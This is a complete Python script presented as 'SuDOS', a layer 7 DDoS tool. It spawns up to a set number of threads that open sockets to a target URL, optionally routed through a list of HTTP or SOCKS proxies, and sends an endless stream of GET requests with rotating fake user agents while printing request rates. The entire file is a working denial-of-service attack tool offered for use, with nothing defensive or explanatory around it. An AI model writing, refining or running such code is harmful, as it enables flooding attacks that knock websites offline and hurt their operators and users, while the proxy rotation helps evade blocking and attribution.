#!/usr/bin/env python
#version: 1.0 release
import threading
import argparse
import random
import atexit
import socket
import socks
import time
import ssl
import sys

active_connections = 0
connection_limit = 0
active_threads = 0
max_threads = 100
delay = 1

hrs = 0
total_hrs = 0
total_connected = 0

user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:27.0) Gecko/20100101 Firefox/27.0",
    "AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1) ",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en) ",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/534.34 (KHTML,like Gecko) PhantomJS/1.9.0 (development) Safari/534.34",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)"
]

def sudos(url, **kwargs):
    try:
        global active_threads
        global active_connections
        global hrs
        global total_hrs
        global total_connected
        active_threads += 1
        connected = False
        proxy_type = kwargs.get("proxy_type")
        proxy_host = kwargs.get("proxy_host")
        proxy_port = kwargs.get("proxy_port")
        url_dict = url_split(url)
        if not url_dict:
            print(f"sudos error: invalid url")
            return
        protocol = url_dict["protocol"]
        host = url_dict["domain"]
        port = url_dict["port"]
        path = url_dict["path"]
        parameters = url_dict["parameters"]
        if proxy_host:
            if not proxy_type:
                print(f"sudos error: missing proxy type")
                return
            elif not proxy_port:
                print(f"sudos error: missing proxy port")
                return
            try:
                proxy_port = int(proxy_port)
            except ValueError:
                print(f"sudos error: unable to convert proxy port to integer")
                return
        if proxy_host:
            sock = socks.socksocket()
            sock.set_proxy(proxy_type, proxy_host, proxy_port)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        connected = True
        active_connections += 1
        total_connected += 1
        if protocol == "https":
            context = ssl.create_default_context()
            sock = context.wrap_socket(sock, server_hostname=host)
        while True:
            if active_connections < connection_limit:
                continue
            user_agent = random.choice(user_agents)
            http = f"GET {path}?{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\n\r\n"
            sock.send(http.encode())
            hrs += 1
            total_hrs += 1
            time.sleep(delay)
    except Exception as e:
        #print(f"sudos error: {e}")
        pass
    finally:
        active_threads -= 1
        if connected:
            active_connections -= 1

def verbose():
    try:
        global hrs
        while True:
            print(f"Threads: {active_threads} Connections: {active_connections} HR/s: {hrs}")
            hrs = 0
            time.sleep(1)
    except Exception:
        pass

def url_split(url):
    try:
        try:
            protocol, url = url.split("://", 1)
        except ValueError:
            return
        try:
            domain, path = url.split("/", 1)
        except ValueError:
            domain = url
            path = ""
        try:
            domain, port = domain.split(":", 1)
        except ValueError:
            if protocol == "https":
                port = 443
            else:
                port = 80
        port = int(port)
        try:
            path, parameters = path.split("?", 1)
        except ValueError:
            parameters = None
        path = f"/{path}"
        url_dict = {}
        url_dict["protocol"] = protocol
        url_dict["domain"] = domain
        url_dict["port"] = port
        url_dict["path"] = path
        url_dict["parameters"] = parameters
        return url_dict
    except Exception:
        return

def onexit():
    print(f"\r\nTotal Requests: {total_hrs}\r\nTotal Connected: {total_connected}")

def main():
    try:
        global max_threads
        global delay
        global connection_limit
        parser = argparse.ArgumentParser(description="SuDOS, powerful layer 7 proxy-based DDoS tool.")
        parser.add_argument("-t", "--threads", type=int, default=100, metavar="INT", help="Max thread count")
        parser.add_argument("-z", "--proxy-type", choices=["http", "socks4", "socks5"], metavar="PROXYTYPE", help="Proxy list type")
        parser.add_argument("-x", "--proxy-list", metavar="PROXYFILE", help="Proxy list file")
        parser.add_argument("-c", "--timeout", type=int, default=5, metavar="TIMEOUT", help="Socket connection timeout")
        parser.add_argument("-v", "--delay", type=int, default=1, metavar="DELAY", help="Timeout per HTTP request")
        parser.add_argument("-b", "--connection-limit", type=int, metavar="INT", help="Connected socket count before flooding the target server")
        parser.add_argument("url", nargs="?", metavar="URL", help="Target URL including protocol, domain and port for particular use")
        args = parser.parse_args()

        max_threads = args.threads
        proxy_type = args.proxy_type
        proxy_list = args.proxy_list
        timeout = args.timeout
        url = args.url
        if not url:
            print(f"ERROR: URL is required")
            parser.print_usage()
            sys.exit()
        
        socket.setdefaulttimeout(timeout)
        delay = args.delay

        if args.connection_limit:
            connection_limit = args.connection_limit

        if not url_split(url):
            print(f"ERROR: Invalid URL")
            sys.exit()

        if proxy_list:
            if not proxy_type:
                print(f"ERROR: Proxy type is missing")
                sys.exit()
            try:
                proxy_list = open(proxy_list, "r")
                proxies = proxy_list.readlines()
                proxy_list.close()
            except FileNotFoundError:
                print(f"ERROR: Proxy list file not found")
                sys.exit()
            except Exception:
                print(f"ERROR: Invalid proxy list file")
                sys.exit()
            proxy_type = proxy_type.upper()
            proxy_type = getattr(socks, proxy_type)
        atexit.register(onexit)
        threading.Thread(target=verbose, daemon=True).start()
        if proxy_list:
            while True:
                for proxy in proxies:
                    proxy = proxy.strip()
                    try:
                        proxy_host, proxy_port = proxy.split(":")
                    except Exception:
                        continue
                    try:
                        proxy_port = int(proxy_port)
                    except Exception:
                        continue
                    while True:
                        if active_threads >= max_threads:
                            continue
                        threading.Thread(target=sudos, args=[url], kwargs={"proxy_type": proxy_type, "proxy_host": proxy_host, "proxy_port": proxy_port}, daemon=True).start()
                        break
        else:
            while True:
                if active_threads >= max_threads:
                    continue
                threading.Thread(target=sudos, args=[url], daemon=True).start()
    except KeyboardInterrupt:
        sys.exit()
    except Exception:
        pass

if __name__ == "__main__":
    main()
